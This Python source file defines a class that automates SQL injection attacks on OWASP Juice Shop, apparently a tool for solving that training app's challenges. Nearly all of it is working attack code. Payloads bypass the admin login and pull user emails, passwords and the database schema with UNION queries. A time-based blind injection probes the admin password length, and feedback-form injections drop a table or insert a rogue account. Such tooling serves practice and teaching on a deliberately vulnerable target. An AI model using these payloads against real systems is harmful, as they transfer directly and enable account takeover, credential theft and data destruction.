import logging
import time
from typing import Dict, List, Any, Optional
from ...core.api_client import JuiceShopAPI
from ...core.browser_automation import BrowserAutomation


class SQLInjectionExploits:
    """
    SQL Injection Exploits für OWASP Juice Shop
    """
    
    def __init__(self, api: JuiceShopAPI, browser: Optional[BrowserAutomation] = None):
        self.api = api
        self.browser = browser
        self.logger = logging.getLogger(__name__)
        
    def exploit_login_admin(self) -> Dict[str, Any]:
        """
        Challenge: Login Admin
        Exploit: SQL Injection in Login Form
        """
        self.logger.info("Exploiting: Login Admin via SQL Injection")
        
        # Classic SQL Injection payload
        payloads = [
            {"email": "admin@juice-sh.op'--", "password": "anything"},
            {"email": "admin@juice-sh.op' OR '1'='1'--", "password": "anything"},
            {"email": "' OR 1=1--", "password": "anything"},
            {"email": "admin'--", "password": "anything"}
        ]
        
        for payload in payloads:
            try:
                result = self.api.login(payload['email'], payload['password'])
                if 'authentication' in result:
                    self.logger.success(f"Admin login successful with payload: {payload['email']}")
                    return {
                        'success': True,
                        'challenge': 'Login Admin',
                        'payload': payload,
                        'result': result
                    }
            except Exception as e:
                self.logger.debug(f"Payload failed: {payload['email']}")
                
        return {'success': False, 'challenge': 'Login Admin'}
        
    def exploit_product_search(self) -> Dict[str, Any]:
        """
        Challenge: Christmas Special
        Exploit: SQL Injection in Product Search
        """
        self.logger.info("Exploiting: Product Search SQL Injection")
        
        # SQL Injection to show all products including hidden ones
        payloads = [
            "')) OR 1=1--",
            "' OR '1'='1",
            "qwert')) UNION SELECT * FROM products--",
            "')) OR 1=1; --",
            "')) OR true--"
        ]
        
        for payload in payloads:
            try:
                result = self.api.get_products(search=payload)
                
                # Check if we got hidden products
                if 'data' in result:
                    hidden_products = [p for p in result['data'] if 'Christmas' in p.get('name', '')]
                    if hidden_products:
                        self.logger.success(f"Found hidden products with payload: {payload}")
                        return {
                            'success': True,
                            'challenge': 'Christmas Special',
                            'payload': payload,
                            'hidden_products': hidden_products
                        }
            except Exception as e:
                self.logger.debug(f"Search payload failed: {payload}")
                
        return {'success': False, 'challenge': 'Christmas Special'}
        
    def exploit_user_credentials(self) -> Dict[str, Any]:
        """
        Challenge: User Credentials
        Exploit: SQL Injection to extract user database
        """
        self.logger.info("Exploiting: Extract User Credentials via SQL Injection")
        
        # UNION based SQL Injection
        payloads = [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT email,password,'','','','','','' FROM Users--",
            "') UNION SELECT id,email,password,'1','2','3','4','5' FROM Users--",
            "')) UNION SELECT * FROM Users--"
        ]
        
        extracted_users = []
        
        for payload in payloads:
            try:
                result = self.api.get_products(search=payload)
                
                # Parse response for user data
                if 'data' in result and result['data']:
                    # Check if response contains email-like data
                    for item in result['data']:
                        if '@' in str(item.get('name', '')):
                            extracted_users.append(item)
                            
                if extracted_users:
                    self.logger.success(f"Extracted user credentials with payload: {payload}")
                    return {
                        'success': True,
                        'challenge': 'User Credentials',
                        'payload': payload,
                        'users': extracted_users
                    }
            except Exception as e:
                self.logger.debug(f"Extraction payload failed: {payload}")
                
        return {'success': False, 'challenge': 'User Credentials'}
        
    def exploit_database_schema(self) -> Dict[str, Any]:
        """
        Challenge: Database Schema
        Exploit: SQL Injection to extract database structure
        """
        self.logger.info("Exploiting: Extract Database Schema")
        
        # Schema extraction payloads
        payloads = [
            "' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
            "')) UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT 1,sql,3,4,5,6,7,8 FROM sqlite_master--"
        ]
        
        schema_info = []
        
        for payload in payloads:
            try:
                result = self.api.get_products(search=payload)
                
                if 'data' in result and result['data']:
                    # Look for CREATE TABLE statements
                    for item in result['data']:
                        desc = str(item.get('description', ''))
                        if 'CREATE TABLE' in desc or 'INTEGER' in desc or 'VARCHAR' in desc:
                            schema_info.append(item)
                            
                if schema_info:
                    self.logger.success(f"Extracted schema with payload: {payload}")
                    return {
                        'success': True,
                        'challenge': 'Database Schema',
                        'payload': payload,
                        'schema': schema_info
                    }
            except Exception as e:
                self.logger.debug(f"Schema extraction failed: {payload}")
                
        return {'success': False, 'challenge': 'Database Schema'}
        
    def exploit_order_by(self) -> Dict[str, Any]:
        """
        Exploit: ORDER BY SQL Injection
        """
        self.logger.info("Exploiting: ORDER BY SQL Injection")
        
        # ORDER BY injection payloads
        payloads = [
            "'; SELECT CASE WHEN (1=1) THEN name ELSE price END--",
            "' ORDER BY (SELECT * FROM Users)--",
            "' ORDER BY 1,2,3,4,5,6,7,8,9--"
        ]
        
        for payload in payloads:
            try:
                # Try different endpoints that might have ORDER BY
                endpoints = [
                    f"/rest/products/search?q=apple{payload}",
                    f"/api/Products?sort=name{payload}"
                ]
                
                for endpoint in endpoints:
                    response = self.api._make_request('GET', endpoint)
                    if response.status_code == 500:  # SQL error
                        self.logger.success(f"ORDER BY injection successful: {payload}")
                        return {
                            'success': True,
                            'challenge': 'ORDER BY Injection',
                            'payload': payload,
                            'endpoint': endpoint
                        }
            except Exception as e:
                self.logger.debug(f"ORDER BY payload failed: {payload}")
                
        return {'success': False, 'challenge': 'ORDER BY Injection'}
        
    def exploit_blind_sql_injection(self) -> Dict[str, Any]:
        """
        Challenge: Blind SQL Injection
        Exploit: Time-based blind SQL injection
        """
        self.logger.info("Exploiting: Blind SQL Injection")
        
        # Time-based blind SQL injection
        base_payload = "' AND (SELECT CASE WHEN ({condition}) THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)=1--"
        
        # Test conditions
        conditions = [
            "1=1",  # Should be slow
            "1=2",  # Should be fast
            "SELECT COUNT(*) FROM Users > 0",  # Check if Users table exists
            "SELECT LENGTH(password) FROM Users WHERE email='admin@juice-sh.op' > 10"  # Check admin password length
        ]
        
        results = []
        
        for condition in conditions:
            payload = base_payload.format(condition=condition)
            
            try:
                start_time = time.time()
                self.api.get_products(search=payload)
                elapsed = time.time() - start_time
                
                is_true = elapsed > 2  # If response takes more than 2 seconds
                results.append({
                    'condition': condition,
                    'result': is_true,
                    'time': elapsed
                })
                
                self.logger.info(f"Blind SQL: {condition} = {is_true} (took {elapsed:.2f}s)")
                
            except Exception as e:
                self.logger.debug(f"Blind SQL failed for condition: {condition}")
                
        if results:
            return {
                'success': True,
                'challenge': 'Blind SQL Injection',
                'payload': base_payload,
                'results': results
            }
            
        return {'success': False, 'challenge': 'Blind SQL Injection'}
        
    def exploit_feedback_sql_injection(self) -> Dict[str, Any]:
        """
        Challenge: Feedback SQL Injection
        """
        self.logger.info("Exploiting: Feedback Form SQL Injection")
        
        if not self.browser:
            self.logger.warning("Browser required for feedback form exploitation")
            return {'success': False, 'challenge': 'Feedback SQL Injection', 'error': 'Browser required'}
            
        try:
            # Navigate to contact/feedback page
            self.browser.navigate(f"{self.api.base_url}/#/contact")
            time.sleep(2)
            
            # SQL Injection in feedback form
            payloads = [
                {"comment": "Great site!'); DROP TABLE Feedbacks;--", "rating": 5},
                {"comment": "'); INSERT INTO Users (email,password) VALUES ('hacker@evil.com','password123');--", "rating": 5},
                {"comment": "' OR '1'='1", "rating": 5}
            ]
            
            for payload in payloads:
                # Fill form
                comment_field = self.browser.wait_for_element("textarea[name='comment']")
                self.browser.type_text(comment_field, payload['comment'])
                
                # Handle CAPTCHA if present
                captcha_result = self._solve_feedback_captcha()
                
                # Submit
                submit_button = self.browser.wait_for_clickable("button[type='submit']")
                self.browser.click(submit_button)
                
                time.sleep(1)
                
                # Check for success
                if "Thank you" in self.browser.get_page_source():
                    self.logger.success(f"Feedback SQL injection successful: {payload['comment']}")
                    return {
                        'success': True,
                        'challenge': 'Feedback SQL Injection',
                        'payload': payload
                    }
                    
        except Exception as e:
            self.logger.error(f"Feedback exploitation failed: {e}")
            
        return {'success': False, 'challenge': 'Feedback SQL Injection'}
        
    def _solve_feedback_captcha(self) -> Dict[str, Any]:
        """Helper: Löst CAPTCHA für Feedback Form"""
        try:
            # Get CAPTCHA from API
            captcha_data = self.api.get_captcha()
            
            if captcha_data and 'answer' in captcha_data:
                # Fill CAPTCHA field
                captcha_field = self.browser.find_element("input[name='captcha']")
                if captcha_field:
                    self.browser.type_text(captcha_field, str(captcha_data['answer']))
                    return captcha_data
        except:
            pass
        return {}
        
    def run_all(self) -> List[Dict[str, Any]]:
        """Führt alle SQL Injection Exploits aus"""
        exploits = [
            self.exploit_login_admin,
            self.exploit_product_search,
            self.exploit_user_credentials,
            self.exploit_database_schema,
            self.exploit_order_by,
            self.exploit_blind_sql_injection
        ]
        
        if self.browser:
            exploits.append(self.exploit_feedback_sql_injection)
            
        results = []
        for exploit in exploits:
            try:
                result = exploit()
                results.append(result)
                time.sleep(1)  # Delay between exploits
            except Exception as e:
                self.logger.error(f"Exploit failed: {e}")
                results.append({
                    'success': False,
                    'error': str(e),
                    'exploit': exploit.__name__
                })
                
        return results